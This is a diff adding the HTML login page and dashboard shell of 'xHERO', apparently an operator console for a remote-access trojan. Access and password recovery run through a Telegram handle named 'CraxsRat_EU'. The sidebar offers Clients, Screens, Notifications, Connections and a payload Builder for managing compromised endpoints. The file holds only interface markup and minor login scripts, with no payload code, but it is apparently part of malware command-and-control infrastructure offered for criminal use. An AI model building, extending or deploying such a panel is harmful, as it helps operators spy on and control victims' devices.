@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <meta name="robots" content="index, follow">
+    <title>xHERO - Secure Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://www.gstatic.com">
+</head>
+<body>
+    <!-- Login View (shown when not authenticated) -->
+    <div id="login-view" class="login-page" style="display: none;">
+        <div class="background-animation"></div>
+        <div class="background-3d"></div>
+        <div class="animated-ambient"></div>
+        <div class="grid-neon"></div>
+
+        <main class="login-shell">
+            <section class="login-showcase">
+                <div class="showcase-header">
+                    <span class="showcase-logo">XHERO</span>
+                    <span class="showcase-tagline">OPERATOR CONSOLE</span>
+                </div>
+                <h1>Take Control of Every Endpoint</h1>
+                <p class="showcase-copy">
+                    Advanced telemetry, live command streaming, and incident-ready tooling in one secure view.
+                </p>
+                <ul class="showcase-highlights">
+                    <li>Live session health and status intelligence</li>
+                    <li>Download-ready data vault with zero-friction navigation</li>
+                    <li>Signal alerts with prioritized escalation queues</li>
+                    <li class="highlight-green">Protected by multi-region Firebase Auth</li>
+                </ul>
+                <div class="showcase-footer">
+                    <a class="contact-admin-link" href="https://t.me/CraxsRat_EU" target="_blank" rel="noopener noreferrer">
+                        Need access? Contact admin
+                    </a>
+                </div>
+            </section>
+
+            <section class="login-card" aria-labelledby="login-title">
+                <div class="login-card-header">
+                    <h2 id="login-title">Secure Sign In</h2>
+                    <p>Authenticate with your operator credentials to launch the panel.</p>
+                </div>
+                <form id="login-form" novalidate>
+                    <div class="field-group">
+                        <label class="field-label" for="email">Email</label>
+                        <div class="field-control">
+                            <input type="email" id="email" name="email" autocomplete="email" required maxlength="254" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$">
+                            <span class="field-focus-glow"></span>
+                        </div>
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label" for="password">Password</label>
+                        <div class="field-control">
+                            <input type="password" id="password" name="password" autocomplete="current-password" required minlength="6" maxlength="128">
+                            <button type="button" class="password-toggle" aria-label="Toggle password visibility">
+                                <i class="material-icons">visibility</i>
+                            </button>
+                            <span class="field-focus-glow"></span>
+                        </div>
+                    </div>
+                    <div class="login-toolbar">
+                        <label class="remember-toggle">
+                            <input type="checkbox" id="login-remember">
+                            <span class="toggle-display"></span>
+                            <span class="toggle-label">Remember this device</span>
+                        </label>
+                        <a class="forgot-link" href="https://t.me/CraxsRat_EU" target="_blank" rel="noopener noreferrer">Forgot credentials?</a>
+                    </div>
+                    <button type="submit" id="login-button">Sign In</button>
+                    <p id="login-error" role="alert" aria-live="polite"></p>
+                </form>
+                <footer class="login-footer">
+                    <span class="footer-title">OPERATOR ONBOARDING</span>
+                    <p>Access is restricted. Request provisioning directly via our Telegram channel.</p>
+                </footer>
+            </section>
+        </main>
+    </div>
+
+    <!-- Panel View (shown when authenticated) -->
+    <div id="panel-view" class="main-container" style="display: none;">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <span class="logo">xHERO</span>
+            </div>
+            <nav class="sidebar-nav">
+                <ul>
+                    <li data-page="servers"><i class="material-icons">dns</i> Servers</li>
+                    <li data-page="clients" class="active"><i class="material-icons">people</i> Clients</li>
+                    <li data-page="screens"><i class="material-icons">screenshot</i> Screens</li>
+                    <li data-page="notifications"><i class="material-icons">notifications</i> Notifications</li>
+                    <li data-page="connections"><i class="material-icons">link</i> Connections</li>
+                    <li data-page="builder"><i class="material-icons">build</i> Builder</li>
+                    <li data-page="blocked"><i class="material-icons">block</i> Blocked</li>
+                    <li data-page="updates"><i class="material-icons">update</i> Updates</li>
+                    <li data-page="profile"><i class="material-icons">person</i> Profile</li>
+                    <li data-page="logout"><i class="material-icons">logout</i> Logout</li>
+                </ul>
+            </nav>
+        </aside>
+
+        <main class="content-area" id="main-content-area">
+             <!-- Content will be injected by JavaScript -->
+        </main>
+    </div>
+
+    <!-- Modal for Data Viewing -->
+    <div class="modal-overlay" id="data-modal" style="display:none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="data-modal-title">Data</h2>
+                <button class="modal-close" id="data-modal-close">&times;</button>
+            </div>
+            <div id="data-modal-body">
+                <!-- Data will be loaded here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Confirmation Modal -->
+    <div class="modal-overlay" id="confirm-modal" style="display:none;">
+        <div class="confirm-modal-content">
+            <h3 id="confirm-modal-title">Are you sure?</h3>
+            <p id="confirm-modal-text"></p>
+            <div class="confirm-modal-actions">
+                <button id="confirm-modal-ok">OK</button>
+                <button id="confirm-modal-cancel">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <script type="module" src="auth.js"></script>
+    <script type="module" src="app.js"></script>
+    <script>
+        // Password toggle functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            const passwordToggle = document.querySelector('.password-toggle');
+            const passwordInput = document.getElementById('password');
+
+            if (passwordToggle && passwordInput) {
+                passwordToggle.addEventListener('click', () => {
+                    const isPassword = passwordInput.type === 'password';
+                    passwordInput.type = isPassword ? 'text' : 'password';
+                    const icon = passwordToggle.querySelector('.material-icons');
+                    if (icon) {
+                        icon.textContent = isPassword ? 'visibility_off' : 'visibility';
+                    }
+                    passwordToggle.setAttribute('aria-pressed', String(isPassword));
+                });
+            }
+
+            // Input sanitization helper
+            window.sanitizeInput = function(input) {
+                if (typeof input !== 'string') return '';
+                return input.replace(/[<>]/g, '').trim();
+            };
+
+            // Rate limiting for login attempts
+            let loginAttempts = 0;
+            let lastAttemptTime = 0;
+            const MAX_ATTEMPTS = 5;
+            const LOCKOUT_TIME = 15 * 60 * 1000; // 15 minutes
+
+            window.checkRateLimit = function() {
+                const now = Date.now();
+                if (now - lastAttemptTime > LOCKOUT_TIME) {
+                    loginAttempts = 0;
+                }
+                if (loginAttempts >= MAX_ATTEMPTS) {
+                    const remaining = Math.ceil((LOCKOUT_TIME - (now - lastAttemptTime)) / 1000 / 60);
+                    return { allowed: false, message: `Too many login attempts. Please try again in ${remaining} minutes.` };
+                }
+                return { allowed: true };
+            };
+
+            window.recordLoginAttempt = function(success) {
+                if (success) {
+                    loginAttempts = 0;
+                } else {
+                    loginAttempts++;
+                    lastAttemptTime = Date.now();
+                }
+            };
+        });
+    </script>
+</body>
+</html>
